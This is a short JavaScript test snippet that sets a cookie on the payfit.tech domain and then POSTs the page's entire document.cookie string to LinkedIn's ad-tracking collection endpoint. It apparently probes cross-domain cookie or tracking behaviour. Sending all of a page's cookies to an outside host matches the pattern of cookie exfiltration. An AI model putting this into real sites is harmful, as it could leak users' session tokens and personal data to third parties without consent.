document.cookie = "test_cookie=from_github;domain=.payfit.tech;path=/";

console.info("TEST", document.cookie);

fetch('https://px.ads.linkedin.com/collect', {
  method: "POST",
  // mode: "cors",
  // cache: "no-cache",
  // credentials: "same-origin",
  headers: {
    "Content-Type": "application/json",
  },
  // redirect: "follow",
  // referrerPolicy: "no-referrer",
  body: JSON.stringify(document.cookie)
})
  .then((a) => {
    console.info('INFO', a);
  })
  .catch((err) => {
    console.error('ERROR', err);
  });

